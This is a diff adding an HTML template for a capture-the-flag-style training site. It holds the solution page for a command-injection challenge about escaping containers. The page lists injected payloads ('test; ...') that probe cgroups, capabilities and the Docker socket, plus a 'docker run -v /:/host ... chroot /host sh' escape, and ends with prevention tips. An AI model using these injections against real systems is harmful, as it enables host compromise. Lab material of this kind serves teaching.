@@ -1,0 +1,101 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: Command Injection in Container Environments - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">Solution: Command Injection in Container Environments</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <i class="bi bi-info-circle-fill me-2"></i>
+                    <strong>Challenge:</strong> Exploit command injection in a containerized application to escape the container environment.
+                </div>
+
+                <h3 class="mt-4">Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates command injection in a containerized environment. The goal is to exploit the vulnerability to escape the container and access the host system, representing a critical security breach in container security.
+                </p>
+
+                <h3 class="mt-4">Solution Steps</h3>
+                <ol>
+                    <li>
+                        <p><strong>Identify container environment:</strong> Confirm you're in a container.</p>
+                        <pre class="bg-light p-3 rounded"><code>test; cat /proc/1/cgroup</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Check container capabilities:</strong> Examine container permissions.</p>
+                        <pre class="bg-light p-3 rounded"><code>test; capsh --print</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Look for escape vectors:</strong> Search for container escape opportunities.</p>
+                        <pre class="bg-light p-3 rounded"><code>test; mount | grep docker</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Attempt container escape:</strong> Try various escape techniques.</p>
+                        <pre class="bg-light p-3 rounded"><code>test; docker run -v /:/host -it alpine chroot /host sh</code></pre>
+                    </li>
+                </ol>
+
+                <h3 class="mt-4">Container Escape Techniques</h3>
+                <ul>
+                    <li><code>test; cat /proc/1/cgroup</code> - Check if in container</li>
+                    <li><code>test; capsh --print</code> - Check capabilities</li>
+                    <li><code>test; mount | grep docker</code> - Look for Docker mounts</li>
+                    <li><code>test; ls -la /var/run/docker.sock</code> - Check Docker socket access</li>
+                    <li><code>test; fdisk -l</code> - List host devices</li>
+                </ul>
+
+                <h3 class="mt-4">Container Security Context</h3>
+                <p>Container escape vulnerabilities can occur through:</p>
+                <ul>
+                    <li>Privileged containers</li>
+                    <li>Host volume mounts</li>
+                    <li>Docker socket exposure</li>
+                    <li>Kernel vulnerabilities</li>
+                    <li>Misconfigured capabilities</li>
+                </ul>
+
+                <h3 class="mt-4">Container Technologies</h3>
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>Container Runtimes:</h6>
+                        <ul>
+                            <li>Docker</li>
+                            <li>Podman</li>
+                            <li>containerd</li>
+                            <li>CRI-O</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>Orchestration:</h6>
+                        <ul>
+                            <li>Kubernetes</li>
+                            <li>Docker Swarm</li>
+                            <li>OpenShift</li>
+                            <li>Nomad</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h3 class="mt-4">Prevention</h3>
+                <ol>
+                    <li><strong>Least Privilege:</strong> Run containers with minimal privileges</li>
+                    <li><strong>No Privileged Mode:</strong> Avoid --privileged flag</li>
+                    <li><strong>Read-Only Filesystems:</strong> Use read-only root filesystems</li>
+                    <li><strong>Security Contexts:</strong> Implement proper security contexts</li>
+                    <li><strong>Network Policies:</strong> Implement network segmentation</li>
+                </ol>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('cmdi_level17') }}" class="btn btn-outline-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end"><i class="bi bi-list me-2"></i>All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
